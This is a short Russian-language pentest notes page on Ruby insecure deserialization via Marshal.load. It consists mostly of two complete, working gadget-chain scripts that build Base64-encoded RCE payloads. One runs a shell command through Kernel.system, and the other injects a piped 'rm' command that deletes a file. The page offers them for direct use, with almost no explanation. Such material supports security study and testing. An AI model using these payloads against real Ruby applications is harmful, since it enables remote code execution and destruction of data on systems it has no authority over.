# Ruby

Функция `Marshal.load`.

Payloads All The Things: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)

Сериализованные данные начинаются с:

```
04 08 ...
```

Пример:

![](<../../../.gitbook/assets/изображение (1) (1).png>)

## RCE Gadgets

### Universal Gadget Ruby 2.x-3.x

Link: [https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "ls -la /home")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
# puts Marshal.load(payload)


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

### Unversal Gadget Ruby 2.0-2.5

```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
    def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
    def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
    def marshal_dump
        [$dependency_list]
    end
end

payload = Marshal.dump(Gem::Requirement.new)

require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
